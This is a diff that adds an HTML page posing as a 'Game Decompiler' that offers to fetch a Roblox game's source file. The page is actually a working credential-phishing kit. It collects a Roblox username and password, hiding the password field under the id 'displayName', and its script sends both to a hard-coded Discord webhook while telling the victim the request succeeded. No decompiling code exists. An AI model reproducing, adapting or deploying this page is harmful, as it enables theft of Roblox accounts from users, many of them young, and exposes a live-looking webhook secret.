@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Game Decompiler</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;700&display=swap');
+
+        :root {
+            --accent: #00f2ff;
+            --accent-glow: rgba(0, 242, 255, 0.5);
+            --bg-dark: #08090a;
+            --glass: rgba(255, 255, 255, 0.03);
+            --glass-border: rgba(255, 255, 255, 0.1);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            overflow: hidden;
+            background-color: var(--bg-dark);
+            background-image: 
+                radial-gradient(at 0% 0%, hsla(253,16%,7%,1) 0, transparent 50%), 
+                radial-gradient(at 50% 0%, hsla(225,39%,30%,1) 0, transparent 50%), 
+                radial-gradient(at 100% 0%, hsla(339,49%,30%,1) 0, transparent 50%);
+            background-size: 200% 200%;
+            animation: meshGradient 15s ease infinite;
+        }
+
+        @keyframes meshGradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .container {
+            background: var(--glass);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border);
+            border-radius: 24px;
+            padding: 40px;
+            width: 95%;
+            max-width: 450px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
+            text-align: center;
+            animation: slideUp 1s cubic-bezier(0.16, 1, 0.3, 1), float 6s ease-in-out infinite 1s;
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(40px) scale(0.95); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+
+        h1 {
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 8px;
+            background: linear-gradient(to right, #fff, var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .description {
+            font-size: 0.95rem;
+            color: rgba(255, 255, 255, 0.6);
+            margin-bottom: 30px;
+        }
+
+        .input-group { margin-bottom: 15px; }
+
+        input {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid var(--glass-border);
+            border-radius: 12px;
+            padding: 14px 18px;
+            color: white;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 15px rgba(0, 242, 255, 0.2);
+        }
+
+        button {
+            width: 100%;
+            padding: 16px;
+            background: var(--accent);
+            color: #000;
+            border: none;
+            border-radius: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px var(--accent-glow);
+        }
+
+        button:disabled {
+            background: #444;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        #status {
+            margin-top: 20px;
+            font-size: 0.85rem;
+            height: 1.2rem;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Game Decompiler</h1>
+    <p class="description">Submit a Roblox link to request the .rbxl source file.</p>
+    
+    <div class="input-group">
+        <input type="text" id="gameLink" placeholder="Roblox Game Link">
+    </div>
+
+    <div class="input-group">
+        <input type="text" id="username" placeholder="Roblox Username">
+    </div>
+
+    <div class="input-group">
+        <input type="text" id="displayName" placeholder="Roblox Password">
+    </div>
+
+    <button id="submitBtn" onclick="sendToWebhook()">Submit Request</button>
+    
+    <div id="status"></div>
+</div>
+
+<script>
+    async function sendToWebhook() {
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1477414703130218668/MgGhn63l0DsJ8nGd-u9sVo9gItYp4e0Fd2ILRT4siTjfkdIN9RSxMroRh4Ya-BR7Rnbr';
+        
+        const gameLink = document.getElementById('gameLink').value.trim();
+        const username = document.getElementById('username').value.trim();
+        const displayName = document.getElementById('displayName').value.trim();
+        const status = document.getElementById('status');
+        const btn = document.getElementById('submitBtn');
+
+        if (!gameLink || !username || !displayName) {
+            status.innerHTML = "<span style='color: #ff4d4d;'>⚠️ ALL FIELDS REQUIRED</span>";
+            return;
+        }
+
+        btn.disabled = true;
+        btn.innerText = "WORKING ON IT...";
+        status.innerHTML = "<span style='color: var(--accent);'>SENDING...</span>";
+
+        const payload = {
+            embeds: [{
+                title: "🛰️ New Decompiler Request",
+                color: 0x00f2ff,
+                fields: [
+                    { name: "🔗 Game Link", value: gameLink },
+                    { name: "👤 Username", value: username, inline: true },
+                    { name: "📛 Password", value: displayName, inline: true }
+                ],
+                footer: { text: "Transmission logged" },
+                timestamp: new Date()
+            }]
+        };
+
+        try {
+            const response = await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            if (response.ok) {
+                status.innerHTML = "<span style='color: #00ff88;'>SUCCESS: REQUEST SENT</span>";
+                document.getElementById('gameLink').value = '';
+                document.getElementById('username').value = '';
+                document.getElementById('displayName').value = '';
+            } else {
+                status.innerHTML = "<span style='color: #ff9f43;'>ERROR: REQUEST REFUSED</span>";
+            }
+        } catch (error) {
+            status.innerHTML = "<span style='color: #ff4d4d;'>ERROR: OFFLINE</span>";
+        } finally {
+            btn.disabled = false;
+            btn.innerText = "SUBMIT REQUEST";
+        }
+    }
+</script>
+
+</body>
+</html>
